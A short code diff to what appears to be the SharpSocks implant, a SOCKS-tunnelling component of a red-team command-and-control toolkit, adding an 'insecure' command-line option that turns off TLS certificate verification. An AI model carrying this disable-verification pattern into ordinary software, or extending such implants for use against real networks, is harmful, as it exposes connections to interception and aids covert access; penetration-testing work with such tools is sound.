@@ -47,6 +47,7 @@ namespace SharpSocksImplant
             string hostHeader = null;
             string key = null;
             short beaconTime = 5000;
+            var insecureTLS = false;
             ushort timeBetweenReads = 500;
             var useProxy = false;
             var standaloneMode = false;
@@ -146,6 +147,11 @@ namespace SharpSocksImplant
                     "a|standalone",
                     "Standalone mode, do not return on the main thread",
                     v => standaloneMode = v != null
+                },
+                {
+                    "i|insecure",
+                    "Turn off TLS verification (only applies if using TLS, obviously)",
+                    v => insecureTLS = v != null
                 }
             };
             optionSet.Parse(args);
@@ -244,7 +250,7 @@ namespace SharpSocksImplant
                 url2
             };
             _sock = PoshCreateProxy.CreateSocksController(serverUri, commandChannelId, hostHeader, userAgent, key, urlPaths, sessionCookieName, payloadCookieName,
-                timeBetweenReads, webProxy, beaconTime, COMMS);
+                timeBetweenReads, webProxy, beaconTime, COMMS, insecureTLS);
             _sock.Start();
             if (standaloneMode)
             {
